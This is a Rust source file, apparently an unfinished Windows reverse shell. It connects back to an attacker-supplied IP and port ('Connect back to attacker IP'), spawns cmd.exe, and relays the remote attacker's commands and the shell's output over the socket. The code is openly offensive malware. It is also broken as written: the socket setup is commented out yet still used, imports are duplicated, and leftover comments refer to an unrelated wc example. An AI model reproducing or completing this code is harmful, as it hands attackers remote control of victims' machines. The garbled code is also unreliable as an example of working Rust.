/// Windows Shell
use std::net::{TcpStream, SocketAddr};
use std::fs::File;
use std::process::{Command, Stdio};
use std::{thread, time};
use std::io::{Read, Write};
use std::error::Error;

extern crate socket2;
extern crate tokio;

 use std::os::windows::prelude::*;
 use tokio::net::{TcpStream, TcpListener};

// Windows based imports
use std::os::windows::io::{FromRawSocket, IntoRawSocket, AsRawSocket};
use std::os::windows::io::{FromRawHandle, AsRawHandle};

// use self::socket2::{Socket, Domain, Type};
    
impl AsRawHandle for TcpStream {
 fn as_raw_handle(&self) -> RawHandle {
     self.io.get_ref().as_raw_handle()
 }
}

impl AsRawHandle for TcpListener {
 fn as_raw_handle(&self) -> RawHandle {
     self.listener.io().as_raw_handle()
 }
}


pub fn shell(ip: String, port: String) {
    // ET, Phone Home!
    let home = [ip, port].join(":");

    sh(home)

}

fn sh(home: String){

        // // create a TCP listener bound to two addresses
        // let socket = Socket::new(Domain::ipv4(), Type::stream(), None).unwrap();

        // // Connect back to attacker IP
        // socket.connect(&home.parse::<SocketAddr>().unwrap().into());

        let mut s = socket.into_tcp_stream();

        // Open shell
        let process = Command::new("cmd")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn().unwrap();

        // Write a string to the `stdin` of `wc`.
        //
        // `stdin` has type `Option<ChildStdin>`, but since we know this instance
        // must have one, we can directly `unwrap` it.
        let mut buf = vec![];
        s.read(&mut buf);
        match process.stdin.unwrap().write_all(&buf) {
            Err(why) => panic!("couldn't write to shell stdin: {}", why.description()),
            Ok(_) => println!("send command to shell"),
        }

        // Because `stdin` does not live after the above calls, it is `drop`ed,
        // and the pipe is closed.
        //
        // This is very important, otherwise `wc` wouldn't start processing the
        // input we just sent.

        // The `stdout` field also has type `Option<ChildStdout>` so must be unwrapped.
        match process.stdout.unwrap().read_to_end(&mut buf) {
            Err(why) => panic!("couldn't read shell stdout: {}", why.description()),
            Ok(_) => s.write_all(&buf).unwrap(),
        }


    // println!("Shell exited");
    sh(home);

}
